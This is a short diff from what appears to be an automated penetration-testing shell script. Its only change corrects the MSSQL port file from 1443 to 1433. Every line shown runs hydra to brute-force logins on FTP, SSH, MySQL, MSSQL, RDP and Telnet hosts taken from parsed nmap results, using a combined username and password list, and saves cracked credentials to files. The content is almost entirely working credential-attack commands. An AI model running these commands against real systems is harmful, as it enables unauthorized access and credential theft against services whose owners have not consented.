@@ -114,7 +114,7 @@ mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1443-TCP.txt mssql -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1433-TCP.txt mssql -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
 
